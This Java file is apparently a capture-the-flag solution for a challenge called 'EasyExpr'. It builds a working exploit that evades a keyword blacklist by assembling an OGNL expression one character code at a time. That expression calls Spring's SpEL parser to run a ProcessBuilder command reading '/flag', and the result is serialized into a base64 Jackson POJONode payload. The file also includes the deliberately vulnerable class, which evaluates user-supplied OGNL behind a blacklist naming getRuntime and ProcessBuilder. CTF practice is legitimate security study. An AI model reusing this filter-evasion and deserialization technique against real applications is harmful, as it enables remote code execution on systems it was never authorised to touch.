package dev.silente.javashark.solution;


import com.fasterxml.jackson.databind.node.POJONode;
import dev.silente.javashark.utils.MiscUtils;
import dev.silente.javashark.utils.SerializeUtils;
import ognl.Ognl;
import ognl.OgnlContext;
import ognl.OgnlException;

import java.io.*;

public class Car2023EasyExpr {

    static String getChar(char ch) {
        return "(#" + (char)ch + " = new Character(" + (int)ch + ").toString())";
    }

    static String generateChar() {
        StringBuffer s = new StringBuffer();
        for (char pos = 'a'; pos <= 'z'; ++pos) {
            s.append(getChar(pos));
            s.append('.');
        }
        for (char pos = 'A'; pos <= 'Z'; ++pos) {
            s.append(getChar(pos));
            s.append('.');
        }

        for (char pos = '0'; pos <= '9'; ++pos) {
            s.append("(#num" + pos + " = new Character(" + (int)(pos) + ").toString())");
            s.append('.');
        }

        s.append("(#dot = new Character(" + (int)'.' + ").toString())");
        s.append('.');
        s.append("(#qquot = new Character(" + (int)'"' + ").toString())");
        s.append('.');
        s.append("(#quot = new Character(" + (int)'\'' + ").toString())");
        s.append('.');
        s.append("(#lq = new Character(" + (int)'(' + ").toString())");
        s.append('.');
        s.append("(#rq = new Character(" + (int)')' + ").toString())");
        s.append('.');
        s.append("(#lw = new Character(" + (int)'[' + ").toString())");
        s.append('.');
        s.append("(#rw = new Character(" + (int)']' + ").toString())");
        s.append('.');
        s.append("(#sb = new Character(" + (int)';' + ").toString())");
        s.append('.');
        s.append("(#eqq = new Character(" + (int)'=' + ").toString())");
        s.append('.');
        s.append("(#spaces = new Character(" + (int)' ' + ").toString())");
        s.append('.');
        s.append("(#lines = new Character(" + (int)'|' + ").toString())");
        s.append('.');
        s.append("(#neko = new Character(" + (int)'-' + ").toString())");
        s.append('.');
        s.append("(#ltt = new Character(" + (int)'{' + ").toString())");
        s.append('.');
        s.append("(#rtt = new Character(" + (int)'}' + ").toString())");
        s.append('.');
        s.append("(#plotst = new Character(" + (int)',' + ").toString())");
        s.append('.');
        s.append("(#rbq = new Character(" + (int)'/' + ").toString())");
        s.append('.');
        return s.toString();
    }

    static String makeString(String s) {
        StringBuffer make = new StringBuffer();
        char[] ss = s.toCharArray();
        for (char ch: ss) {
            if (ch == '.') {
                make.append("#dot+");
            }
            else if (ch == '\"') {
                make.append("#qquot+");
            }
            else if (ch == '\'') {
                make.append("#quot+");
            }
            else if (ch == '(') {
                make.append("#lq+");
            }
            else if (ch == ')') {
                make.append("#rq+");
            }
            else if (ch == '[') {
                make.append("#lw+");
            }
            else if (ch == ']') {
                make.append("#rw+");
            }
            else if (ch == ';') {
                make.append("#sb+");
            }
            else if (ch == '=') {
                make.append("#eqq+");
            }
            else if (ch == ' ') {
                make.append("#spaces+");
            }
            else if (ch == '|') {
                make.append("#lines+");
            }
            else if (ch == '-') {
                make.append("#neko+");
            }
            else if (ch == '{') {
                make.append("#ltt+");
            }
            else if (ch == '}') {
                make.append("#rtt+");
            }
            else if (ch == ',') {
                make.append("#plotst+");
            }
            else if (ch == '/') {
                make.append("#rbq+");
            }
            else if (ch <= '9' && ch >= '0') {
                make.append("#num" + ch + "+");
            }
            else {
                make.append("#").append(ch).append("+");
            }
        }
        return make.substring(0, make.length() - 1);
    }

    public static void main(String[] args) throws Exception {
        String spel = "new java.util.Scanner(new java.lang.ProcessBuilder(\"cat\", \"/flag\").start().getInputStream(), \"GBK\").useDelimiter(\"asfsfsdfsf\").next()";
        String expr = generateChar() +
                "(#el = #this.getClass().forName(" + makeString("org.springframework.expression.spel.standard.SpelExpressionParser") +").newInstance())." +
                "(#input = #el.parseExpression(" + makeString(spel) + ").getValue())";
        User user = new User("foo", "bar", expr);
        Object pojo = new POJONode(user);
        String code = MiscUtils.base64Encode(SerializeUtils.serialize(pojo));
        System.out.println(code);

        System.out.println(pojo);
    }
}



/* Car2023 EasyExpr */
class User implements Serializable {
    private String username;

    private String password;

    private String expr;

    public User() {}

    public User(String username, String password, String expr) {
        this.username = username;
        this.password = password;
        this.expr = expr;
    }

    public String getUsername() {
        return this.username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return this.password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public String getExpr() {
        return this.expr;
    }

    public void setExpr(String expr) {
        this.expr = expr;
    }

    public Boolean filter() {
        String[] BlackList = {
                "\"", "'", "\\u", "invoke", "getClass", "\\x", "$", "{", "}", "@",
                "js", "getRuntime", "java", "script", "ProcessBuilder", "start", "flag" };
//        String[] BlackList = {};
        String str = this.expr.toLowerCase();
        for (String keyword : BlackList) {
            if (str.contains(keyword))
                return Boolean.valueOf(true);
        }
        return Boolean.valueOf(false);
    }

    public String getResult() {
        System.out.println("getResult");
        try {
            if (!filter().booleanValue()) {
                OgnlContext ognlContext = new OgnlContext();
                return Ognl.getValue(this.expr, ognlContext).toString();
            }
            else {
                System.out.println("NONONO");
            }
        } catch (OgnlException var2) {
            return "fail";
        }
        return "fail";
    }
}